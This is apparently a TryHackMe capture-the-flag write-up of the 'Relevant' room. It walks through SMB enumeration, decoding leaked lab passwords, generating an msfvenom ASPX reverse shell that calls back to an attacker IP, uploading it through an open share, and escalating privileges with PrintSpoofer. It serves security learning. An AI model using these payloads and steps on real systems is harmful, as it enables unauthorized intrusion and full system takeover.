## Relevant
---
THM Relevant Room Walkthrough: https://tryhackme.com/room/relevant



## Summary
---
- nmap
- smb share open --> nt4wrksv
- passwords.txt
- port 49663 open --> subdomain /nt4wrksv accessible
- smb allows for upload and download of files (get/put) --> can upload a reverse shell and then access through browser
- catch reverse shell --> user flag
- find user flag
- check whoami & whoami /priv --> SeImpersonatePrivilege enabled is a major security concern
- use JuicyPotato or PrintSpoofer to escalate
- Upload [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and run as instructed
- whoami --> 



## Difficulties/Lessons Learned
---
- Main difficulty on this room was the long enum time for subdirectories and the system constantly freezing
- learning about PrintSpoofer and User Priv in Windows



## Walkthrough
---
Let's first begin by enumerating the machine with nmap. We will run nmap with

```bash
nmap -sS -sV -sC -Pn  <TARGET_IP>
```

![](attachments/Screenshot%202025-02-01%20160003.png)

We can see we have 5 open ports. It's good to keep in mind we only scanned the default number of ports with nmap, which by default should be the 1000 most popular ports.

The 3 most interesting ports we have here are 80, 445, and 3389. (Webserver, SMB shares, RDP access)

Let's start by looking into these. The webserver seems to host this page: 

![](attachments/Screenshot%202025-02-01%20160429.png)

The first thing I think of when I see this and port 445 open is a possible EternalBlue exploit depending on the version of Windows Server.

The only other thing on this website is a link to https://www.iis.net/?utm_medium=iis-deployment with no other interesting information. There may also be something hidden in the image, but let's not get too deep.

Let's check the SMB port, 445. We will use smbclient with the command

```bash
smbclient -L //10.10.71.74
```

We see we have some shares available. We have 3 hidden shares indicated by the $ and then a regular share. 

![](attachments/Screenshot%202025-02-01%20161102.png)

Let's try to connect to them anonymously without passing a -U (User) param.

![](attachments/Screenshot%202025-02-01%20161728.png)

I was able to connect to the IPC share and the last share. I would not expect to find anything in the IPC share because it's used for Inter-Process Communication and not file storage. What's interesting is we were able to see that the last share nt4wrksv actually has a file in it. Let's download it and check it out.

![](attachments/Screenshot%202025-02-01%20162800.png)

We see that we have some encoded passwords. It looked like Base64 was used to encode them so let's decode them to see if we have anything here.

![](attachments/Screenshot%202025-02-01%20163104.png)

We get a username and some passwords! 

```bash
Bill - Juw4nnaM4n420696969!$$$
Bob - !P@$$W0rD!123 
```

The only place I can think to use them is RDP since that port is also open. Let's try. 

RDP does not seem to work with either password and just fails or freezes.

![](attachments/Pasted%20image%2020250201170439.png)

At this point I was feeling a bit stuck. Let's maybe try to enum the subdirectories and then let's look at SMB again. Maybe we can exploit something there. 

Running Gobuster gives us nothing interesting in terms of directories and takes very long. I used directory-list-2.3-medium.txt

The machine became unresponsive which was common in this lab and I had to restart it. I ran MS17-010 SMB RCE Detection to see if maybe the system is vulnerable to EternalBlue. The result told me that the host is likely vulnerable to it, so I tried running EternalBlue.

![](attachments/Pasted%20image%2020250201172528.png)

It did not work and again froze the system. 

The only thing I can think of is to nmap all the ports instead of just the 1000 most popular ports. This also takes very long.

![](attachments/Pasted%20image%2020250201174152.png)

Interesting find. We have 3 extra ports that we missed. We have a webserver at 49663. Let's see what we can find if we go to it in a browser.

Weird. It takes us to the same page. Let's just try to check the other ports as well. I would not expect to find anything since they are RPC ports according to nmap.

![](attachments/Pasted%20image%2020250201192451.png)

As expected the other 2 ports don't resolve.

The image takes us to the same link as the last image and other than the port, it looks identical to the page on port 80. Let's try to enumerate subdirectories with the new port.

This box is extremely slow and freezes often, requiring reboots. I found a subdirectory matching the SMB share (/nt4wrksv) that loads an empty page. Since it may access the same directory, I checked for passwords.txt via the browser—and it worked. If I can upload files, I might get a reverse shell. Time to generate and upload one.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.101.68 LPORT=4444 -f aspx -o rev.aspx
```

Generated a rev shell with MSFVenom. We know it's a windows server using IIS, we should maybe be able to use aspx, asp, or php.Uploading this with the smbclient and accessing this through the web server. Setting up an nc listener on port 444.

```bash
smbclient //10.10.219.157/nt4wrksv
put rev.aspx
exit

nc -lvp 4444
```

Accessing the webserver with the rev shell takes a second, but we are in!

![](attachments/Pasted%20image%2020250201195449.png)
 
 Navigating to the Users directory and then Bob>Desktop gives us our first flag!

![](attachments/Pasted%20image%2020250201195710.png)

Checking whoami and whoami /priv we get 

![](attachments/Pasted%20image%2020250201202051.png)

The SeImpersonatePrivilege Priv being enabled is a major issue based on my research. We can use something like JuicyPotato or PrintSpoofer to escalate. Let's try Printspoofer since we can easily upload files with SMB.

![](attachments/Pasted%20image%2020250201203400.png)

Priv has been escalted. Found the root flag in C:\Users\Administrator\Desktop\root.txt

![](attachments/Pasted%20image%2020250201203643.png)


